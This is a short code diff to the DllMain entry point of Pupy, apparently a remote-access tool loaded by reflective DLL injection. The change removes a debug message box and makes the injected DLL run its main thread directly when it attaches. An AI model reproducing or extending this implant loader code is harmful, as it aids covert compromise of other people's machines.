@@ -3,8 +3,6 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 */
 
-#pragma comment(lib, "user32")
-
 #include <windows.h>
 #include "pupy_load.h"
 #include "ReflectiveDllInjection.h"
@@ -23,9 +21,9 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 				*(HMODULE *)lpReserved = hAppInstance;
 		break;
 		case DLL_PROCESS_ATTACH:
-					//MessageBoxA(0, "injection ok", "injection ok", MB_OK | MB_ICONINFORMATION);
 			hAppInstance = hinstDLL;
-			/* mainThread(NULL); */
+			mainThread(NULL);
+            /*
 			hThread = CreateThread(NULL,
 					0,		// dwStackSize
 					mainThread,	// lpStartAddress
@@ -33,7 +31,7 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 					0,		// dwCreationFlags (0==run right after creation)
 					&threadId
 					);
-
+            */
 			break;
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
